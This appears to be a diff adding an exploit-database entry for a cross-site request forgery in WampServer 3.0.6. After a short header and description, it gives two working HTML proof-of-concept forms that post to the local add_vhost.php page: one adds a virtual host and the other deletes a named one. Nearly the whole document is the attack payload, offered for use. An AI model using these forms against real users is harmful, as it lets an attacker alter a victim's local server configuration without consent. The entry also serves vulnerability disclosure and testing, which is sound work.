@@ -1,0 +1,38 @@
+# Exploit Title: WampServer 3.0.6 - Cross-Site Request Forgery
+# Date: 2018-06-11
+# Exploit Author: L0RD
+# Software Link: https://ufile.io/gpqh9
+# Vendor Homepage: http://www.wampserver.com/en/
+# Version: 3.0.6 - 64bit
+# Tested on: Win 10
+
+# Description :
+# An issue was discovered in WampServer 3.0.6 which allows a remote
+# attacker to force any victim to add or delete virtual hosts.
+
+# POC 1 :
+# Add virtual hosts exploit :
+
+<html>
+ <head>
+   <title>Exploit</title>
+ </head>
+<body>
+  <form action="http://localhost/add_vhost.php?lang=english" method="post">
+    <input type="hidden" name="vh_name" value="lord" />
+    <input type="hidden" name="vh_ip" value="" />
+    <input type="hidden" name="vh_folder" value="C:\wamp64\www"/>
+    <input type="submit" name="submit" value="test">
+  </form>
+ </body>
+</html>
+
+# POC 2 :
+# Delete virtual hosts exploit :
+# Use this exploit to delete specific vhost :
+# Exploit :
+
+<form method='post' action="http://localhost/add_vhost.php?lang=english">
+    <input type='hidden' name='virtual_del[]' value='Set your vhost name here' checked="true" />
+    <input type="submit" name="vhostdelete" value="test">
+</form>
